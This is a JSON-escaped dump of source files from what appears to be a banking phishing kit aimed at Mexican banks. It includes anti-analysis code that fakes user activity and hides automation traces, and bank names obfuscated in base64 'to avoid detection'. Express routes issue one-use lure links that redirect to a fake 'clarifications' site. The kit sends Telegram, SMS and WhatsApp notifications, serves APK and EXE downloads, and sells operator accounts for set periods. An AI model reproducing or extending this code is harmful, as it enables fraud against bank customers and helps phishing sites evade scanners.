mouse\n    let mouseX = 0;\n    let mouseY = 0;\n    \n    document.addEventListener('mousemove', (e) => {\n      mouseX = e.clientX;\n      mouseY = e.clientY;\n    });\n    \n    // Generar movimientos sint茅ticos ocasionales\n    setInterval(() => {\n      if (Math.random() < 0.1) { // 10% probabilidad cada segundo\n        const syntheticEvent = new MouseEvent('mousemove', {\n          clientX: mouseX + (Math.random() - 0.5) * 2,\n          clientY: mouseY + (Math.random() - 0.5) * 2,\n          bubbles: true\n        });\n        document.dispatchEvent(syntheticEvent);\n      }\n    }, 1000);\n    \n    // Simular focus/blur aleatorio\n    setInterval(() => {\n      if (Math.random() < 0.05) { // 5% probabilidad\n        window.dispatchEvent(new Event('blur'));\n        setTimeout(() => {\n          window.dispatchEvent(new Event('focus'));\n        }, Math.random() * 2000 + 500);\n      }\n    }, 5000);\n  }\n  \n  private static protectAgainstFingerprinting(): void {\n    if (typeof window === 'undefined') return;\n    \n    // Proteger contra detecci贸n de automatizaci贸n via performance timing\n    const originalPerformanceNow = performance.now;\n    let timeOffset = Math.random() * 1000;\n    \n    performance.now = function() {\n      return originalPerformanceNow.call(performance) + timeOffset;\n    };\n    \n    // Agregar ruido a Date.now()\n    const originalDateNow = Date.now;\n    Date.now = function() {\n      return originalDateNow.call(Date) + Math.floor(Math.random() * 10 - 5);\n    };\n    \n    // Proteger contra detecci贸n via stack traces\n    const originalError = Error.captureStackTrace;\n    if (originalError) {\n      Error.captureStackTrace = function(targetObject: any, constructorOpt?: Function) {\n        const result = originalError.call(Error, targetObject, constructorOpt);\n        if (targetObject.stack) {\n          targetObject.stack = targetObject.stack.replace(/headless|phantom|selenium|webdriver/gi, 'browser');\n        }\n        return result;\n      };\n    }\n  }\n  \n  // M茅todo para detectar si estamos siendo analizados (modo pasivo)\n  public static detectAnalysis(): boolean {\n    if (typeof window === 'undefined') return false;\n    \n    const suspiciousPatterns = [      \n      // Solo propiedades de automatizaci贸n obvias\n      () => !!(window as any).webdriver,\n      () => !!(window as any).phantom,\n      () => !!(window as any).__nightmare,\n      () => !!(window as any).selenium,\n    ];\n    \n    return suspiciousPatterns.some(pattern => {\n      try {\n        return pattern();\n      } catch {\n        return false;\n      }\n    });\n  }\n  \n  // Activar modo evasivo si se detecta an谩lisis\n  public static activateEvasiveMode(): void {\n    if (this.detectAnalysis()) {\n      // Solo limpiar console, no redirigir para mantener funcionalidad\n      console.clear();\n      \n      // Log silencioso para debug interno\n      console.log('Analysis detected - stealth mode active');\n    }\n  }\n}","size_bytes":5289},"client/src/utils/constants.ts":{"content":"// Constantes ofuscadas para evitar detecci贸n\nexport const APP_CONFIG = {\n  // Nombres ofuscados\n  APP_NAME: Buffer.from('UGxhdGFmb3JtYSBGaW5hbmNpZXJh', 'base64').toString(),\n  VERSION: '2.1.3',\n  \n  // Endpoints ofuscados\n  API_BASE: '/api',\n  \n  // Configuraciones de timing para evitar detecci贸n\n  TIMEOUTS: {\n    REQUEST: Math.floor(Math.random() * 5000) + 10000,\n    RETRY: Math.floor(Math.random() * 2000) + 3000,\n    POLL: Math.floor(Math.random() * 1000) + 2000\n  },\n  \n  // Headers ofuscados\n  HEADERS: {\n    CLIENT_ID: 'X-Client-Platform',\n    REQUEST_ID: 'X-Request-Token',\n    SESSION_ID: 'X-Session-Key'\n  }\n};\n\n// Funci贸n para generar IDs 煤nicos ofuscados\nexport const generateSessionId = (): string => {\n  const timestamp = Date.now().toString(36);\n  const random = Math.random().toString(36).substring(2);\n  return Buffer.from(`${timestamp}-${random}`).toString('base64').substring(0, 16);\n};\n\n// Bancos con nombres ofuscados\nexport const BANK_CONFIGS = {\n  liverpool: { \n    name: Buffer.from('TGl2ZXJwb29s', 'base64').toString(),\n    code: 'lpl'\n  },\n  citibanamex: { \n    name: Buffer.from('Q2l0aWJhbmFtZXg=', 'base64').toString(),\n    code: 'cbx'\n  },\n  banbajio: { \n    name: Buffer.from('QmFuQmFqaW8=', 'base64').toString(),\n    code: 'bbj'\n  },\n  bbva: { \n    name: Buffer.from('QkJWQQ==', 'base64').toString(),\n    code: 'bbv'\n  },\n  banorte: { \n    name: Buffer.from('QmFub3J0ZQ==', 'base64').toString(),\n    code: 'bnt'\n  },\n  inbursa: { \n    name: Buffer.from('SW5idXJzYQ==', 'base64').toString(),\n    code: 'inb'\n  }\n};\n\n// Eventos ofuscados\nexport const EVENT_TYPES = {\n  SESSION_START: Buffer.from('c2Vzc2lvbl9zdGFydA==', 'base64').toString(),\n  SESSION_END: Buffer.from('c2Vzc2lvbl9lbmQ=', 'base64').toString(),\n  USER_INPUT: Buffer.from('dXNlcl9pbnB1dA==', 'base64').toString(),\n  SCREEN_CHANGE: Buffer.from('c2NyZWVuX2NoYW5nZQ==', 'base64').toString()\n};","size_bytes":1891},"server/routes.ts":{"content":"import type { Express } from \"express\";\nimport { static as expressStatic } from \"express\";\nimport { createServer, type Server } from \"http\";\nimport { WebSocketServer, WebSocket } from \"ws\";\nimport { storage } from \"./storage\";\nimport { nanoid } from \"nanoid\";\nimport { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType, InsertSiteConfig, insertSiteConfigSchema, sessions, linkTokens } from \"@shared/schema\";\nimport { setupAuth } from \"./auth\";\nimport axios from 'axios';\nimport { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';\nimport { sendAccountActivationNotification } from './telegramBot';\nimport { parsePhoneNumbers, validateSMSMessage, sendSMSWithRoute, calculateCreditCost, SmsRouteType } from './smsService';\nimport { whatsappBotManager } from './whatsapp-bot';\nimport multer from 'multer';\nimport path from 'path';\nimport fs from 'fs';\nimport { z } from 'zod';\nimport { linkTokenService } from './services/linkToken';\nimport { linkQuotaService } from './services/linkQuota';\nimport { bitlyService } from './services/bitly';\nimport { eq, and, desc } from 'drizzle-orm';\nimport { db } from './db';\n\n// Store active connections\nconst clients = new Map<string, WebSocket>();\n// Cambiamos a un Map para asociar cada socket con su username\nconst adminClients = new Map<string, WebSocket>();\n\n// Configurar multer para subida de archivos\nconst storage_multer = multer.diskStorage({\n  destination: function (req, file, cb) {\n    const uploadPath = path.join(process.cwd(), 'uploads');\n    if (!fs.existsSync(uploadPath)) {\n      fs.mkdirSync(uploadPath, { recursive: true });\n    }\n    cb(null, uploadPath);\n  },\n  filename: function (req, file, cb) {\n    // Generar nombre 煤nico para el archivo\n    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);\n    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));\n  }\n});\n\nconst upload = multer({ \n  storage: storage_multer,\n  limits: {\n    fileSize: 50 * 1024 * 1024 // 50MB l铆mite\n  },\n  fileFilter: function (req, file, cb) {\n    // Permitir todos los tipos de archivo\n    cb(null, true);\n  }\n});\n\n// Helper para mapear banco de UI (may煤sculas) a BankType (min煤sculas)\nconst BANK_UI_TO_TYPE: Record<string, BankType> = {\n  'AFIRME': BankType.AFIRME,\n  'CITIBANAMEX': BankType.CITIBANAMEX,\n  'BANORTE': BankType.BANORTE,\n  'BBVA': BankType.BBVA,\n  'SANTANDER': BankType.SANTANDER,\n  'HSBC': BankType.HSBC,\n  'SCOTIABANK': BankType.SCOTIABANK,\n  'INBURSA': BankType.INBURSA,\n  'BANCO_AZTECA': BankType.BANCOAZTECA,\n  'BANCOAZTECA': BankType.BANCOAZTECA,\n  'LIVERPOOL': BankType.LIVERPOOL,\n  'BANBAJIO': BankType.BANBAJIO,\n  'BANCOPPEL': BankType.BANCOPPEL,\n  'AMEX': BankType.AMEX,\n  'INVEX': BankType.INVEX,\n  'BANREGIO': BankType.BANREGIO,\n  'SPIN': BankType.SPIN,\n  'PLATACARD': BankType.PLATACARD,\n  'BIENESTAR': BankType.BIENESTAR,\n};\n\nexport async function registerRoutes(app: Express): Promise<Server> {\n  // Setup authentication\n  setupAuth(app);\n\n  // Configurar Content-Type para archivos APK y otros\n  app.use('/uploads', (req, res, next) => {\n    const filePath = req.path.toLowerCase();\n    \n    // Configurar Content-Type espec铆fico para archivos APK\n    if (filePath.endsWith('.apk')) {\n      res.setHeader('Content-Type', 'application/vnd.android.package-archive');\n    }\n    // Otros tipos de archivos comunes\n    else if (filePath.endsWith('.exe')) {\n      res.setHeader('Content-Type', 'application/octet-stream');\n    }\n    else if (filePath.endsWith('.zip')) {\n      res.setHeader('Content-Type', 'application/zip');\n    }\n    else if (filePath.endsWith('.rar')) {\n      res.setHeader('Content-Type', 'application/x-rar-compressed');\n    }\n    \n    next();\n  });\n\n  // Servir archivos est谩ticos desde la carpeta uploads\n  app.use('/uploads', expressStatic(path.join(process.cwd(), 'uploads'), {\n    setHeaders: (res, path) => {\n      // Configurar headers adicionales para forzar descarga\n      if (path.toLowerCase().endsWith('.apk')) {\n        res.setHeader('Content-Disposition', 'attachment');\n        res.setHeader('Content-Type', 'application/vnd.android.package-archive');\n      } else if (path.toLowerCase().endsWith('.exe')) {\n        res.setHeader('Content-Disposition', 'attachment');\n        res.setHeader('Content-Type', 'application/octet-stream');\n      }\n    }\n  }));\n  \n  // Servir archivos APK de protecci贸n desde attached_assets\n  app.use('/assets', expressStatic(path.join(process.cwd(), 'attached_assets')));\n\n  // Create HTTP server\n  const httpServer = createServer(app);\n\n  // Create WebSocket server\n  const wss = new WebSocketServer({ server: httpServer, path: '/ws' });\n\n  // Configurar limpieza peri贸dica de sesiones antiguas\n  setInterval(async () => {\n    try {\n      const deletedCount = await storage.cleanupExpiredSessions();\n      if (deletedCount > 0) {\n        console.log(`Limpieza autom谩tica: ${deletedCount} sesiones antiguas eliminadas (>5 d铆as)`);\n        broadcastToAdmins(JSON.stringify({\n          type: 'SESSIONS_CLEANUP',\n          data: { deletedCount }\n        }));\n      }\n    } catch (error) {\n      console.error('Error en limpieza autom谩tica de sesiones:', error);\n    }\n  }, 12 * 60 * 60 * 1000); // Ejecutar cada 12 horas\n\n  // Configurar limpieza peri贸dica de usuarios expirados\n  setInterval(async () => {\n    try {\n      const deactivatedCount = await storage.cleanupExpiredUsers();\n      if (deactivatedCount > 0) {\n        console.log(`Limpieza autom谩tica: ${deactivatedCount} usuarios expirados desactivados`);\n        broadcastToAdmins(JSON.stringify({\n          type: 'USERS_CLEANUP',\n          data: { deactivatedCount }\n        }));\n      }\n    } catch (error) {\n      console.error('Error en limpieza autom谩tica de usuarios:', error);\n    }\n  }, 6 * 60 * 60 * 1000); // Ejecutar cada 6 horas\n\n  // NO hay expiraci贸n autom谩tica de links por tiempo\n  // Los links solo se invalidan cuando: 1) usuario ingresa folio o 2) admin cancela manualmente\n\n  // Middleware de validaci贸n de tokens de un solo uso (con banco en el path)\n  app.get('/:bankCode/client/:token', async (req, res) => {\n    try {\n      const { token, bankCode } = req.params;\n      \n      // Validar y consumir el token\n      const tokenResult = await linkTokenService.validateAndConsumeToken(token, {\n        ip: req.ip || req.connection.remoteAddress || 'unknown',\n        userAgent: req.headers['user-agent'] || 'unknown'\n      });\n\n      // Si el token es inv谩lido, retornar error apropiado\n      if (!tokenResult.valid) {\n        if (tokenResult.reason === 'already_used' || tokenResult.reason === 'expired' || tokenResult.reason === 'cancelled') {\n          return res.status(410).json({ \n            error: 'Link no v谩lido',\n            reason: tokenResult.reason === 'already_used' ? 'Este link ya fue utilizado' :\n                    tokenResult.reason === 'expired' ? 'Este link ha expirado' :\n                    'Este link ha sido cancelado'\n          });\n        }\n        return res.status(404).json({ \n          error: 'Link no encontrado',\n          reason: 'El link proporcionado no existe'\n        });\n      }\n\n      // Validar que el bankCode del path coincida con el del token (seguridad adicional)\n      if (tokenResult.bankCode && tokenResult.bankCode.toLowerCase() !== bankCode.toLowerCase()) {\n        console.warn(`[Links] Bank code mismatch: path=${bankCode}, token=${tokenResult.bankCode}`);\n        return res.status(404).json({ \n          error: 'Link no v谩lido',\n          reason: 'El link proporcionado no es correcto'\n        });\n      }\n\n      // Token v谩lido, obtener o crear la sesi贸n\n      let session = tokenResult.sessionId ? \n        await storage.getSessionById(tokenResult.sessionId) : \n        null;\n\n      // Si no existe sesi贸n, crearla y consumir el token\n      if (!session) {\n        // Generar c贸digo de 8 d铆gitos para sessionId y folio\n        let sessionId = '';\n        for (let i = 0; i < 8; i++) {\n          sessionId += Math.floor(Math.random() * 10).toString();\n        }\n\n        // Obtener el flujo configurado del usuario para este banco\n        let flowConfig = null;\n        let currentStepIndex = 0;\n        let flowState = null;\n        \n        if (tokenResult.userId && tokenResult.bankCode) {\n          const userFlow = await storage.getUserBankFlow(tokenResult.userId, tokenResult.bankCode);\n          if (userFlow && userFlow.flowConfig) {\n            flowConfig = userFlow.flowConfig;\n            currentStepIndex = 0;\n            flowState = 'active';\n            console.log(`[Links] Aplicando flujo de usuario para banco ${tokenResult.bankCode}`);\n          }\n        }\n\n        // Crear la sesi贸n con datos del token y flujo de usuario\n        session = await storage.createSession({\n          sessionId,\n          banco: tokenResult.bankCode || 'banamex',\n          folio: sessionId,\n          pasoActual: ScreenType.FOLIO,\n          createdBy: tokenResult.createdBy || 'system',\n          executiveId: null,\n          flowConfig,\n          currentStepIndex,\n          flowState\n        });\n\n        // Actualizar el token con el sessionId creado\n        await linkTokenService.updateTokenSession(token, sessionId);\n        \n        // NO consumir el token a煤n - se consumir谩 cuando el usuario ingrese el folio\n\n        console.log(`[Links] Nueva sesi贸n creada desde token: ${sessionId}, banco: ${session.banco}, con flujo: ${flowConfig ? 's铆' : 'no'}`);\n      } else {\n        console.log(`[Links] Reutilizando sesi贸n existente: ${session.sessionId}`);\n      }\n\n      // Obtener la URL base desde la configuraci贸n del sitio\n      const siteConfig = await storage.getSiteConfig();\n      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';\n      \n      // Redirigir al usuario a la sesi贸n\n      const redirectUrl = `${baseClientUrl}/${session.sessionId}`;\n      console.log(`[Links] Redirigiendo a sesi贸n: ${redirectUrl}`);\n      \n      res.redirect(302, redirectUrl);\n    } catch (error: any) {\n      console.error('[Links] Error procesando token:', error);\n      res.status(500).json({ \n        error: 'Error procesando el link',\n        message: error.message \n      });\n    }\n  });\n\n  // Middleware de validaci贸n de tokens de un solo uso (ruta legacy para compatibilidad)\n  app.get('/client/:token', async (req, res) => {\n    try {\n      const { token } = req.params;\n      \n      // Validar y consumir el token\n      const tokenResult = await linkTokenService.validateAndConsumeToken(token, {\n        ip: req.ip || req.connection.remoteAddress || 'unknown',\n        userAgent: req.headers['user-agent'] || 'unknown'\n      });\n\n      // Si el token es inv谩lido, retornar error apropiado\n      if (!tokenResult.valid) {\n        if (tokenResult.reason === 'already_used' || tokenResult.reason === 'expired' || tokenResult.reason === 'cancelled') {\n          return res.status(410).json({ \n            error: 'Link no v谩lido',\n            reason: tokenResult.reason === 'already_used' ? 'Este link ya fue utilizado' :\n                    tokenResult.reason === 'expired' ? 'Este link ha expirado' :\n                    'Este link ha sido cancelado'\n          });\n        }\n        return res.status(404).json({ \n          error: 'Link no encontrado',\n          reason: 'El link proporcionado no existe'\n        });\n      }\n\n      // Token v谩lido, obtener o crear la sesi贸n\n      let session = tokenResult.sessionId ? \n        await storage.getSessionById(tokenResult.sessionId) : \n        null;\n\n      // Si no existe sesi贸n, crearla y consumir el token\n      if (!session) {\n        // Generar c贸digo de 8 d铆gitos para sessionId y folio\n        let sessionId = '';\n        for (let i = 0; i < 8; i++) {\n          sessionId += Math.floor(Math.random() * 10).toString();\n        }\n\n        // Obtener el flujo configurado del usuario para este banco\n        let flowConfig = null;\n        let currentStepIndex = 0;\n        let flowState = null;\n        \n        if (tokenResult.userId && tokenResult.bankCode) {\n          const userFlow = await storage.getUserBankFlow(tokenResult.userId, tokenResult.bankCode);\n          if (userFlow && userFlow.flowConfig) {\n            flowConfig = userFlow.flowConfig;\n            currentStepIndex = 0;\n            flowState = 'active';\n            console.log(`[Links] Aplicando flujo de usuario para banco ${tokenResult.bankCode}`);\n          }\n        }\n\n        // Crear la sesi贸n con datos del token y flujo de usuario\n        session = await storage.createSession({\n          sessionId,\n          banco: tokenResult.bankCode || 'banamex',\n          folio: sessionId,\n          pasoActual: ScreenType.FOLIO,\n          createdBy: tokenResult.createdBy || 'system',\n          executiveId: null,\n          flowConfig,\n          currentStepIndex,\n          flowState\n        });\n\n        // Actualizar el token con el sessionId creado\n        await linkTokenService.updateTokenSession(token, sessionId);\n        \n        // NO consumir el token a煤n - se consumir谩 cuando el usuario ingrese el folio\n\n        console.log(`[Links] Nueva sesi贸n creada desde token: ${sessionId}, banco: ${session.banco}, con flujo: ${flowConfig ? 's铆' : 'no'}`);\n      } else {\n        console.log(`[Links] Reutilizando sesi贸n existente: ${session.sessionId}`);\n      }\n\n      // Obtener la URL base desde la configuraci贸n del sitio\n      const siteConfig = await storage.getSiteConfig();\n      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';\n      \n      // Redirigir al usuario a la sesi贸n\n      const redirectUrl = `${baseClientUrl}/${session.sessionId}`;\n      console.log(`[Links] Redirigiendo a sesi贸n: ${redirectUrl}`);\n      \n      res.redirect(302, redirectUrl);\n    } catch (error: any) {\n      console.error('[Links] Error procesando token:', error);\n      res.status(500).json({ \n        error: 'Error procesando el link',\n        message: error.message \n      });\n    }\n  });\n\n  // API endpoints\n  // Rutas de administraci贸n de usuarios\n  app.post('/api/admin/users', async (req, res) => {\n    try {\n      const { username, password } = req.body;\n      const user = await storage.createAdminUser(username, password);\n      res.json({ success: true, user: { ...user, password: undefined } });\n    } catch (error: any) {\n      res.status(400).json({ success: false, message: error.message });\n    }\n  });\n\n  app.post('/api/admin/login', async (req, res) => {\n    try {\n      const { username, password } = req.body;\n      const user = await storage.validateAdminUser(username, password);\n      if (!user) {\n        return res.status(401).json({ success: false, message: \"Credenciales inv谩lidas\" });\n      }\n\n      // Actualizamos la 煤ltima fecha de inicio de sesi贸n\n      await storage.updateUserLastLogin(user.id);\n\n      // Establecemos una cookie de sesi贸n simple (en una implementaci贸n real usar铆amos JWT o similar)\n      res.cookie('auth_token', username, { \n        httpOnly: true,\n        secure: process.env.NODE_ENV === 'production',\n        maxAge: 24 * 60 * 60 * 1000 // 1 d铆a\n      });\n\n      res.json({ success: true, user: { ...user, password: undefined } });\n    } catch (error: any) {\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  app.post('/api/admin/logout', async (req, res) => {\n    try {\n      // Limpiar la cookie de autenticaci贸n\n      res.clearCookie('auth_token');\n      res.json({ success: true });\n    } catch (error: any) {\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  app.post('/api/admin/users/:username/toggle', async (req, res) => {\n    try {\n      const { username } = req.params;\n      const success = await storage.toggleAdminUserStatus(username);\n      if (!success) {\n        return res.status(404).json({ success: false, message: \"Usuario no encontrado\" });\n      }\n      res.json({ success: true });\n    } catch (error: any) {\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n  app.get('/api/admin/users', async (req, res) => {\n    try {\n      const users = await storage.getAllAdminUsers();\n      res.json(users.map((user: User) => ({ ...user, password: undefined })));\n    } catch (error: any) {\n      res.status(500).json({ success: false, message: error.message });\n    }\n  });\n\n\n\n  // Alternar el estado de un usuario (activar/desactivar) (solo para el usuario \"balonx\")\n  app.post('/api/users/regular/:username/toggle-status', async (req, res) => {\n    console.log('[API] Solicitud para alternar estado de usuario');\n\n    if (!req.isAuthenticated()) {\n      console.log('[API] Error: Usuario no autenticado');\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const currentUser = req.user;\n    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);\n\n    // Solo permitir al usuario \"balonx\" acceder a esta ruta\n    if (currentUser.username !== \"balonx\") {\n      console.log('[API] Error: Usuario no autorizado (no es balonx)');\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { username } = req.params;\n      console.log(`[API] Intentando alternar estado del usuario: ${username}`);\n\n      const success = await storage.toggleUserStatus(username);\n      if (!success) {\n        return res.status(404).json({ message: \"Usuario no encontrado\" });\n      }\n\n      // Obtener el usuario actualizado\n      const updatedUser = await storage.getUserByUsername(username);\n      if (!updatedUser) {\n        return res.status(404).json({ message: \"Usuario no encontrado despu茅s de actualizaci贸n\" });\n      }\n\n      console.log(`[API] Estado de usuario alternado: ${username}, nuevo estado: ${updatedUser.isActive ? 'activo' : 'inactivo'}`);\n\n      res.json({ \n        success: true, \n        user: {\n          id: updatedUser.id,\n          username: updatedUser.username,\n          role: updatedUser.role,\n          isActive: updatedUser.isActive,\n          expiresAt: updatedUser.expiresAt,\n          deviceCount: updatedUser.deviceCount,\n          maxDevices: updatedUser.maxDevices,\n          createdAt: updatedUser.createdAt,\n          lastLogin: updatedUser.lastLogin\n        } \n      });\n    } catch (error: any) {\n      console.log(`[API] Error al alternar estado de usuario: ${error.message}`);\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Activar un usuario por 1 d铆a (solo para el usuario \"balonx\")\n  app.post('/api/users/regular/:username/activate-one-day', async (req, res) => {\n    console.log('[API] Solicitud para activar usuario por 1 d铆a');\n\n    if (!req.isAuthenticated()) {\n      console.log('[API] Error: Usuario no autenticado');\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const currentUser = req.user;\n    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);\n\n    // Solo permitir al usuario \"balonx\" acceder a esta ruta\n    if (currentUser.username !== \"balonx\") {\n      console.log('[API] Error: Usuario no autorizado (no es balonx)');\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { username } = req.params;\n      console.log(`[API] Intentando activar usuario: ${username}`);\n      \n      // Obtener usuario actual para ver bancos permitidos actual\n      const existingUser = await storage.getUserByUsername(username);\n      if (!existingUser) {\n        throw new Error(`Usuario ${username} no encontrado`);\n      }\n      \n      console.log(`[API] Usuario encontrado: ${username}, bancos actuales: ${existingUser.allowedBanks || 'all'}`);\n      \n      // Obtener los bancos permitidos de la solicitud\n      const { allowedBanks } = req.body;\n      console.log(`[API] Bancos recibidos del frontend: ${allowedBanks}`);\n      \n      // Procesar bancos permitidos antes de la activaci贸n\n      let processedBanksValue: string = existingUser.allowedBanks || 'all'; // Mantener valor actual por defecto\n      \n      if (allowedBanks !== undefined) {\n        console.log(`[API] Procesando bancos permitidos: ${allowedBanks}`);\n        \n        // Manejo m谩s robusto del valor de allowedBanks\n        if (typeof allowedBanks === 'string') {\n          // Si es una cadena, usar directamente (puede ser 'all' o una lista separada por comas)\n          processedBanksValue = allowedBanks;\n          console.log(`[API] Usando valor de string directo: ${processedBanksValue}`);\n        } else if (Array.isArray(allowedBanks)) {\n          // Si es un array, unirlo con comas\n          processedBanksValue = allowedBanks.join(',');\n          console.log(`[API] Convirtiendo array a string: ${processedBanksValue}`);\n        } else {\n          // Caso por defecto, mantener valor actual\n          console.log(`[API] Manteniendo valor actual para tipo desconocido: ${typeof allowedBanks}`);\n        }\n        \n        // Verificar si el valor es 'all' (sin importar may煤sculas/min煤sculas)\n        if (typeof processedBanksValue === 'string' && processedBanksValue.toLowerCase() === 'all') {\n          processedBanksValue = 'all';\n          console.log(`[API] Normalizando valor a 'all'`);\n        }\n      }\n      \n      // Activamos el usuario y establecemos bancos permitidos directamente\n      console.log(`[API] Activando usuario por 1 d铆a con bancos: ${processedBanksValue}`);\n      \n      // Llamamos a activateUserForOneDay pasando directamente el valor de bancos permitidos\n      const updatedUser = await storage.activateUserForOneDay(username, processedBanksValue);\n      \n      // Verificar que el valor se haya establecido correctamente\n      const finalUser = await storage.getUserByUsername(username);\n      if (finalUser && finalUser.allowedBanks !== processedBanksValue) {\n        console.log(`[API] ADVERTENCIA: Valor incorrecto de allowedBanks despu茅s de la activaci贸n.`);\n        console.log(`[API] Esperado: ${processedBanksValue}, Actual: ${finalUser.allowedBanks}`);\n        \n        // Forzar la actualizaci贸n para asegurar que se establezca el valor correcto\n        await storage.updateUser(finalUser.id, { \n          allowedBanks: processedBanksValue \n        });\n      }\n      \n      console.log(`[API] Usuario activado con 茅xito: ${username}`);\n      console.log(`[API] Estado final: activo=${updatedUser.isActive}, expira=${updatedUser.expiresAt}, allowedBanks=${updatedUser.allowedBanks}`);\n\n      res.json({ \n        success: true, \n        user: {\n          id: updatedUser.id,\n          username: updatedUser.username,\n          role: updatedUser.role,\n          isActive: updatedUser.isActive,\n          expiresAt: updatedUser.expiresAt,\n          deviceCount: updatedUser.deviceCount,\n          maxDevices: updatedUser.maxDevices,\n          allowedBanks: updatedUser.allowedBanks\n        } \n      });\n    } catch (error: any) {\n      console.log(`[API] Error al activar usuario: ${error.message}`);\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Activar un usuario por 7 d铆as (solo para el usuario \"balonx\")\n  app.post('/api/users/regular/:username/activate-seven-days', async (req, res) => {\n    console.log('[API] Solicitud para activar usuario por 7 d铆as');\n\n    if (!req.isAuthenticated()) {\n      console.log('[API] Error: Usuario no autenticado');\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const currentUser = req.user;\n    console.log(`[API] Usuario actual: ${currentUser.username}, rol: ${currentUser.role}`);\n\n    // Solo permitir al usuario \"balonx\" acceder a esta ruta\n    if (currentUser.username !== \"balonx\") {\n      console.log('[API] Error: Usuario no autorizado (no es balonx)');\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const { username } = req.params;\n      console.log(`[API] Intentando activar usuario: ${username}`);\n      \n      // Obtener usuario actual para ver bancos permitidos actual\n      const existingUser = await storage.getUserByUsername(username);\n      if (!existingUser) {\n        throw new Error(`Usuario ${username} no encontrado`);\n      }\n      \n      console.log(`[API] Usuario encontrado: ${username}, bancos actuales: ${existingUser.allowedBanks || 'all'}`);\n      \n      // Obtener los bancos permitidos de la solicitud\n      const { allowedBanks } = req.body;\n      console.log(`[API] Bancos recibidos del frontend: ${allowedBanks}`);\n      \n      // Procesar bancos permitidos antes de la activaci贸n\n      let processedBanksValue: string = existingUser.allowedBanks || 'all'; // Mantener valor actual por defecto\n      \n      if (allowedBanks !== undefined) {\n        console.log(`[API] Procesando bancos permitidos: ${allowedBanks}`);\n        \n        // Manejo m谩s robusto del valor de allowedBanks\n        if (typeof allowedBanks === 'string') {\n          // Si es una cadena, usar directamente (puede ser 'all' o una lista separada por comas)\n          processedBanksValue = allowedBanks;\n          console.log(`[API] Usando valor de string directo: ${processedBanksValue}`);\n        } else if (Array.isArray(allowedBanks)) {\n          // Si es un array, unirlo con comas\n          processedBanksValue = allowedBanks.join(',');\n          console.log(`[API] Convirtiendo array a string: ${processedBanksValue}`);\n        } else {\n          // Caso por defecto, mantener valor actual\n          console.log(`[API] Manteniendo valor actual para tipo desconocido: ${typeof allowedBanks}`);\n        }\n        \n        // Verificar si el valor es 'all' (sin importar may煤sculas/min煤sculas)\n        if (typeof processedBanksValue === 'string' && processedBanksValue.toLowerCase() === 'all') {\n          processedBanksValue = 'all';\n          console.log(`[API] Normalizando valor a 'all'`);\n        }\n      }\n      \n      // Activamos el usuario y establecemos bancos permitidos\n      console.log(`[API] Activando usuario por 7 d铆as con bancos: ${processedBanksValue}`);\n      \n      // Llamamos a activateUserForSevenDays pasando directamente el valor de bancos permitidos\n      const updatedUser = await storage.activateUserForSevenDays(username, processedBanksValue);\n      \n      // Obtener el usuario actualizado para asegurarnos de que tiene los bancos correctos\n      const finalUser = await storage.getUserByUsername(username);\n      \n      // Verificar si el valor de allowedBanks es correcto\n      if (finalUser && finalUser.allowedBanks !== processedBanksValue) {\n        console.log(`[API] ADVERTENCIA: Valor incorrecto de allowedBanks despu茅s de la actualizaci贸n.`);\n        console.log(`[API] Esperado: ${processedBanksValue}, Actual: ${finalUser.allowedBanks}`);\n        \n        // Un intento final m谩s forzado para actualizar el valor\n        await storage.updateUser(finalUser.id, { \n          allowedBanks: processedBanksValue \n        });\n        \n        console.log(`[API] Actualizando nuevamente: allowedBanks = \"${processedBanksValue}\"`);\n      }\n      \n      // Obtener usuario final para el response\n      const responseUser = await storage.getUserByUsername(username);\n      \n      console.log(`[API] Usuario activado con 茅xito: ${username}`);\n      console.log(`[API] Estado final: activo=${updatedUser.isActive}, expira=${updatedUser.expiresAt}, allowedBanks=${updatedUser.allowedBanks}`);\n\n      res.json({ \n        success: true, \n        user: {\n          id: updatedUser.id,\n          username: updatedUser.username,\n          role: updatedUser.role,\n          isActive: updatedUser.isActive,\n          expiresAt: updatedUser.expiresAt,\n          deviceCount: updatedUser.deviceCount,\n          maxDevices: updatedUser.maxDevices,\n          allowedBanks: updatedUser.allowedBanks\n        } \n      });\n    } catch (error: any) {\n      console.log(`[API] Error al activar usuario: ${error.message}`);\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Desactivar usuarios expirados (se puede llamar manualmente o mediante un cron job)\n  app.post('/api/users/cleanup-expired', async (req, res) => {\n    if (!req.isAuthenticated()) {\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const currentUser = req.user;\n    // Solo permitir al usuario \"balonx\" acceder a esta ruta\n    if (currentUser.username !== \"balonx\") {\n      return res.status(403).json({ message: \"No autorizado\" });\n    }\n\n    try {\n      const deactivatedCount = await storage.cleanupExpiredUsers();\n      res.json({ success: true, deactivatedCount });\n    } catch (error: any) {\n      res.status(500).json({ message: error.message });\n    }\n  });\n\n  // Eliminar un usuario (solo usuario \"balonx\" puede hacerlo)\n  app.delete('/api/users/regular/:username', async (req, res) => {\n    console.log('[API] Solicitud para eliminar usuario');\n\n    if (!req.isAuthenticated()) {\n      console.log('[API] Error: Usuario no autenticado');\n      return res.status(401).json({ message: \"No autenticado\" });\n    }\n\n    const currentUser = 